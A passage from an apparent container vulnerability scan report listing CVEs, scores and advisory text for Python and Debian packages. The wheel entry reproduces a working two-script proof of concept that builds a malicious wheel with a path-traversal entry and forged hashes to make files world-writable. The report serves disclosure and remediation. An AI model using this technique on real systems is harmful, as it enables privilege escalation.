 * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.
 * Disable redirects at the `request()` level instead of the `PoolManager()` level.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>nghttp2</strong> <code>1.64.0-1.1</code> (deb)</summary>

<small><code>pkg:deb/debian/nghttp2@1.64.0-1.1?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-27135?s=debian&n=nghttp2&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="high : CVE--2026--27135" src="https://img.shields.io/badge/CVE--2026--27135-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.024%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

nghttp2 is an implementation of the Hypertext Transfer Protocol version 2 in C. Prior to version 1.68.1, the nghttp2 library stops reading the incoming data when user facing public API `nghttp2_session_terminate_session` or `nghttp2_session_terminate_session2` is called by the application. They might be called internally by the library when it detects the situation that is subject to connection error. Due to the missing internal state validation, the library keeps reading the rest of the data after one of those APIs is called. Then receiving a malformed frame that causes FRAME_SIZE_ERROR causes assertion failure. nghttp2 v1.68.1 adds missing state validation to avoid assertion failure. No known workarounds are available.

---
- nghttp2 1.68.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1131369)
https://github.com/nghttp2/nghttp2/security/advisories/GHSA-6933-cjhr-5qg6
Fixed by: https://github.com/nghttp2/nghttp2/commit/5c7df8fa815ac1004d9ecb9d1f7595c4d37f46e1 (v1.68.1)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>setuptools</strong> <code>75.3.2</code> (pypi)</summary>

<small><code>pkg:pypi/setuptools@75.3.2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-47273?s=github&n=setuptools&t=pypi&vr=%3C78.1.1"><img alt="high 7.7: CVE--2025--47273" src="https://img.shields.io/badge/CVE--2025--47273-lightgrey?label=high%207.7&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><78.1.1</code></td></tr>
<tr><td>Fixed version</td><td><code>78.1.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.487%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>66th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary 
A path traversal vulnerability in `PackageIndex` was fixed in setuptools version 78.1.1

### Details
```
    def _download_url(self, url, tmpdir):
        # Determine download filename
        #
        name, _fragment = egg_info_for_url(url)
        if name:
            while '..' in name:
                name = name.replace('..', '.').replace('\\', '_')
        else:
            name = "__downloaded__"  # default if URL has no path contents

        if name.endswith('.[egg.zip](http://egg.zip/)'):
            name = name[:-4]  # strip the extra .zip before download

 -->       filename = os.path.join(tmpdir, name)
```

Here: https://github.com/pypa/setuptools/blob/6ead555c5fb29bc57fe6105b1bffc163f56fd558/setuptools/package_index.py#L810C1-L825C88

`os.path.join()` discards the first argument `tmpdir` if the second begins with a slash or drive letter.
`name` is derived from a URL without sufficient sanitization. While there is some attempt to sanitize by replacing instances of '..' with '.', it is insufficient.

### Risk Assessment
As easy_install and package_index are deprecated, the exploitation surface is reduced.
However, it seems this could be exploited in a similar fashion like https://github.com/advisories/GHSA-r9hx-vwmv-q579, and as described by POC 4 in https://github.com/advisories/GHSA-cx63-2mw6-8hw5 report: via malicious URLs present on the pages of a package index.

### Impact
An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to RCE depending on the context.

### References
https://huntr.com/bounties/d6362117-ad57-4e83-951f-b8141c6e7ca5
https://github.com/pypa/setuptools/issues/4946

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>wheel</strong> <code>0.43.0</code> (pypi)</summary>

<small><code>pkg:pypi/wheel@0.43.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-24049?s=github&n=wheel&t=pypi&vr=%3E%3D0.40.0%2C%3C%3D0.46.1"><img alt="high 7.1: CVE--2026--24049" src="https://img.shields.io/badge/CVE--2026--24049-lightgrey?label=high%207.1&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code>>=0.40.0<br/><=0.46.1</code></td></tr>
<tr><td>Fixed version</td><td><code>0.46.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.013%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
 - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.  
 - **Root Cause Component:** wheel.cli.unpack.unpack function.  
 - **Affected Packages:**  
   1. wheel (Upstream source)  
   2. setuptools (Downstream, vendors wheel)  
 - **Severity:** High (Allows modifying system file permissions).  

### Details  
The vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.  
```
# Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel)
for zinfo in wf.filelist:
    wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile

    # (2) VULNERABILITY:
    # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.
    # If zinfo.filename contains "../", this targets files outside the destination.
    permissions = zinfo.external_attr >> 16 & 0o777
    destination.joinpath(zinfo.filename).chmod(permissions)
```  

### PoC  
I have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.  

**Prerequisites:** pip install setuptools  

**Step 1: Generate the Malicious Wheel (gen_poc.py)**  
This script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.  
```
import zipfile
import hashlib
import base64
import os

def urlsafe_b64encode(data):
    """
    Helper function to encode data using URL-safe Base64 without padding.
    Required by the Wheel file format specification.
    """
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')

def get_hash_and_size(data_bytes):
    """
    Calculates SHA-256 hash and size of the data.
    These values are required to construct a valid 'RECORD' file,
    which is used by the 'wheel' library to verify integrity.
    """
    digest = hashlib.sha256(data_bytes).digest()
    hash_str = "sha256=" + urlsafe_b64encode(digest)
    return hash_str, str(len(data_bytes))

def create_evil_wheel_v4(filename="evil-1.0-py3-none-any.whl"):
    print(f"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}")

    # 1. Prepare Standard Metadata Content
    # These are minimal required contents to make the wheel look legitimate.
    wheel_content = b"Wheel-Version: 1.0\nGenerator: bdist_wheel (0.37.1)\nRoot-Is-Purelib: true\nTag: py3-none-any\n"
    metadata_content = b"Metadata-Version: 2.1\nName: evil\nVersion: 1.0\nSummary: PoC Package\n"
   
    # 2. Define Malicious Payload (Path Traversal)
    # The content doesn't matter, but the path does.
    payload_content = b"PWNED by Path Traversal"

    # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'
    # The vulnerability allows 'chmod' to affect this path directly.
    malicious_path = "../../poc_target.txt"

    # 3. Calculate Hashes for Integrity Check Bypass
    # The 'wheel' library verifies if the file hash matches the RECORD entry.
    # To bypass this check, we calculate the correct hash for our malicious file.
    wheel_hash, wheel_size = get_hash_and_size(wheel_content)
    metadata_hash, metadata_size = get_hash_and_size(metadata_content)
    payload_hash, payload_size = get_hash_and_size(payload_content)

    # 4. Construct the 'RECORD' File
    # The RECORD file lists all files in the wheel with their hashes.
    # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.
    # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.
    record_lines = [
        f"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}",
        f"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}",
        f"{malicious_path},{payload_hash},{payload_size}",  # <-- Authenticating the malicious path
        "evil-1.0.dist-info/RECORD,,"
    ]
    record_content = "\n".join(record_lines).encode('utf-8')

    # 5. Build the Zip File
    with zipfile.ZipFile(filename, "w") as zf:
        # Write standard metadata files
        zf.writestr("evil-1.0.dist-info/WHEEL", wheel_content)
        zf.writestr("evil-1.0.dist-info/METADATA", metadata_content)
        zf.writestr("evil-1.0.dist-info/RECORD", record_content)

        # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file
        # We need to set specific permission bits to trigger the vulnerability.
        zinfo = zipfile.ZipInfo(malicious_path)
       
        # Set external attributes to 0o777 (rwxrwxrwx)
        # Upper 16 bits: File type (0o100000 = Regular File)
        # Lower 16 bits: Permissions (0o777 = World Writable)
        # The vulnerable 'unpack' function will blindly apply this '777' to the system file.
        zinfo.external_attr = (0o100000 | 0o777) << 16
       
        zf.writestr(zinfo, payload_content)

    print("[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.")

if __name__ == "__main__":
    create_evil_wheel_v4()
```  

**Step 2: Run the Exploit (exploit.py)**  
```
from pathlib import Path
import sys

# Demonstrating impact on setuptools
try:
    from setuptools._vendor.wheel.cli.unpack import unpack
    print("[*] Loaded unpack from setuptools")
except ImportError:
    from wheel.cli.unpack import unpack
    print("[*] Loaded unpack from wheel")

# 1. Setup Target (Read-Only system file simulation)
target = Path("poc_target.txt")
target.write_text("SENSITIVE CONFIG")
target.chmod(0o400) # Read-only
print(f"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}")

# 2. Run Vulnerable Unpack
# The wheel contains "../../poc_target.txt".
# unpack() will extract safely, BUT chmod() will hit the actual target file.
try:
    unpack("evil-1.0-py3-none-any.whl", "unpack_dest")
except Exception as e:
    print(f"[!] Ignored expected extraction error: {e}")

# 3. Check Result
final_perms = oct(target.stat().st_mode)[-3:]
print(f"[*] Final Perms: {final_perms}")

if final_perms == "777":
    print("VULNERABILITY CONFIRMED: Target file is now world-writable (777)!")
else:
    print("[-] Attack failed.")
```  

**result:**  
<img width="806" height="838" alt="image" src="https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db" />  
  
### Impact  
Attackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.  

### Recommended Fix  
The unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().  

### Suggested Patch:  
```
# extract() returns the actual path where the file was written
extracted_path = wf.extract(zinfo, destination)

# Only apply chmod if a file was actually written
if extracted_path:
    permissions = zinfo.external_attr >> 16 & 0o777
    Path(extracted_path).chmod(permissions)
```

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 3" src="https://img.shields.io/badge/M-3-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>werkzeug</strong> <code>3.0.6</code> (pypi)</summary>

<small><code>pkg:pypi/werkzeug@3.0.6</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-27199?s=github&n=werkzeug&t=pypi&vr=%3C3.1.6"><img alt="medium 6.3: CVE--2026--27199" src="https://img.shields.io/badge/CVE--2026--27199-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Handling of Windows Device Names</i>

<table>
<tr><td>Affected range</td><td><code><3.1.6</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.6</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.021%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Werkzeug's `safe_join` function allows Windows device names as filenames if when preceded by other path segments.

This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the added filtering failed to account for the fact that `safe_join` accepts paths with multiple segments, such as `example/NUL`.

`send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-21860?s=github&n=werkzeug&t=pypi&vr=%3C3.1.5"><img alt="medium 6.3: CVE--2026--21860" src="https://img.shields.io/badge/CVE--2026--21860-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Handling of Windows Device Names</i>

<table>
<tr><td>Affected range</td><td><code><3.1.5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.5</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.026%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Werkzeug's `safe_join` function allows path segments with Windows device names that have file extensions or trailing spaces. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. Windows still accepts them with any file extension, such as `CON.txt`, or trailing spaces such as `CON `.

This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the fix failed to account for compound extensions such as `CON.txt.html` or trailing spaces. It also missed some additional special names.

`send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66221?s=github&n=werkzeug&t=pypi&vr=%3C3.1.4"><img alt="medium 6.3: CVE--2025--66221" src="https://img.shields.io/badge/CVE--2025--66221-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Handling of Windows Device Names</i>

<table>
<tr><td>Affected range</td><td><code><3.1.4</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.032%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Werkzeug's `safe_join` function allows path segments with Windows device names. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 3" src="https://img.shields.io/badge/L-3-fce1a9"/> <!-- unspecified: 0 --><strong>krb5</strong> <code>1.21.3-5</code> (deb)</summary>

<small><code>pkg:deb/debian/krb5@1.21.3-5?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-40356?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="medium : CVE--2026--40356" src="https://img.shields.io/badge/CVE--2026--40356-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.099%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In MIT Kerberos 5 (aka krb5) before 1.22.3, there is an integer underflow and resultant out-of-bounds read if an application calls gss_accept_sec_context() on a system with a NegoEx mechanism registered in /etc/gss/mech. An unauthenticated remote attacker can trigger this, possibly causing the process to terminate in parse_message.

---
- krb5 1.22.1-2.1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135317)
https://github.com/krb5/krb5/commit/2e75f0d9362fb979f5fc92829431a590a130929f

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-40355?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="medium : CVE--2026--40355" src="https://img.shields.io/badge/CVE--2026--40355-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.099%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In MIT Kerberos 5 (aka krb5) before 1.22.3, there is a NULL pointer dereference if an application calls gss_accept_sec_context() on a system with a NegoEx mechanism registered in /etc/gss/mech. An unauthenticated remote attacker can trigger this, causing the process to terminate in parse_nego_message.

---
- krb5 1.22.1-2.1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135317)
https://github.com/krb5/krb5/commit/2e75f0d9362fb979f5fc92829431a590a130929f

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-26461?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2024--26461" src="https://img.shields.io/badge/CVE--2024--26461-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.062%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>19th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.

---
- krb5 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098754; unimportant)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_2.md
Fixed by: https://github.com/krb5/krb5/commit/c5f9c816107f70139de11b38aa02db2f1774ee0d
Codepath cannot be triggered via API calls, negligible security impact
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-26458?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2024--26458" src="https://img.shields.io/badge/CVE--2024--26458-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.250%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.

---
- krb5 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098754; unimportant)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_1.md
Fixed by: https://github.com/krb5/krb5/commit/c5f9c816107f70139de11b38aa02db2f1774ee0d
Unused codepath, negligible security impact
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-5709?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2018--5709" src="https://img.shields.io/badge/CVE--2018--5709-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.504%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>81st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable "dbentry->n_key_data" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a "u4" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.

---
- krb5 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=889684)
https://github.com/poojamnit/Kerberos-V5-1.16-Vulnerabilities/tree/master/Integer%20Overflow
non-issue, codepath is only run on trusted input, potential integer
overflow is non-issue

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 3" src="https://img.shields.io/badge/L-3-fce1a9"/> <!-- unspecified: 0 --><strong>libxml2</strong> <code>2.12.7+dfsg+really2.9.14-2.1+deb13u2</code> (deb)</summary>

<small><code>pkg:deb/debian/libxml2@2.12.7%2Bdfsg%2Breally2.9.14-2.1%2Bdeb13u2?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-6732?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="medium : CVE--2026--6732" src="https://img.shields.io/badge/CVE--2026--6732-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.052%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>16th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in libxml2. This vulnerability occurs when the library processes a specially crafted XML Schema Definition (XSD) validated document that includes an internal entity reference. An attacker could exploit this by providing a malicious document, leading to a type confusion error that causes the application to crash. This results in a denial of service (DoS), making the affected system or application unavailable.

---
- libxml2 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1134866)
https://gitlab.gnome.org/GNOME/libxml2/-/issues/1097
https://gitlab.gnome.org/GNOME/libxml2/-/merge_requests/411
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/226b560837b90dea9b14431eca6e6fda8fb01ab4 (master)
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/7cea3fd1557437b88f2c7b5e1b71a2d5fb152b55 (master)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-1757?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--1757" src="https://img.shields.io/badge/CVE--2026--1757-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.009%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was identified in the interactive shell of the xmllint utility, part of the libxml2 project, where memory allocated for user input is not properly released under certain conditions. When a user submits input consisting only of whitespace, the program skips command execution but fails to free the allocated buffer. Repeating this action causes memory to continuously accumulate. Over time, this can exhaust system memory and terminate the xmllint process, creating a denial-of-service condition on the local system.

---
- libxml2 2.15.2+dfsg-0.1 (unimportant)
https://gitlab.gnome.org/GNOME/libxml2/-/issues/1009
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/160c8a43ba37dfb07ebe6446fbad9d0973d9279d
Fixed by: https://gitlab.gnome.org/GNOME/libxml2/-/commit/5446460ad3229579c91506317fb80ab333d44414 (v2.15.2)
Negligible security impact, memory leak in xmllint CLI utility

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-8732?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--8732" src="https://img.shields.io/badge/CVE--2025--8732-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.030%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in libxml2 up to 2.14.5. It has been declared as problematic. This vulnerability affects the function xmlParseSGMLCatalog of the component xmlcatalog. The manipulation leads to uncontrolled recursion. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used. The real existence of this vulnerability is still doubted at the moment. The code maintainer explains, that "[t]he issue can only be triggered with untrusted SGML catalogs and it makes absolutely no sense to use untrusted catalogs. I also doubt that anyone is still using SGML catalogs at all."

---
- libxml2 <unfixed> (unimportant)
https://gitlab.gnome.org/GNOME/libxml2/-/issues/958
https://gitlab.gnome.org/GNOME/libxml2/-/issues/958#note_2505853
Issue can only be triggered with untrusted SGML, negligible security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-12863?s=debian&n=libxml2&ns=debian&t=deb&osn=debian&osv=13&vr=%3E%3D2.12.7%2Bdfsg%2Breally2.9.14-2.1%2Bdeb13u2"><img alt="low : CVE--2025--12863" src="https://img.shields.io/badge/CVE--2025--12863-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=2.12.7+dfsg+really2.9.14-2.1+deb13u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.068%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the xmlSetTreeDoc() function of the libxml2 XML parsing library. This function is responsible for updating document pointers when XML nodes are moved between documents. Due to improper handling of namespace references, a namespace pointer may remain linked to a freed memory region when the original document is destroyed. As a result, subsequent operations that access the namespace can lead to a use-after-free condition, causing an application crash.

---
REJECTED

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>libgcrypt20</strong> <code>1.11.0-7</code> (deb)</summary>

<small><code>pkg:deb/debian/libgcrypt20@1.11.0-7?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-41989?s=debian&n=libgcrypt20&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="medium : CVE--2026--41989" src="https://img.shields.io/badge/CVE--2026--41989-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.015%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Libgcrypt before 1.12.2 sometimes allows a heap-based buffer overflow and denial of service via crafted ECDH ciphertext to gcry_pk_decrypt.

---
- libgcrypt20 1.12.2-1
https://www.openwall.com/lists/oss-security/2026/04/21/1
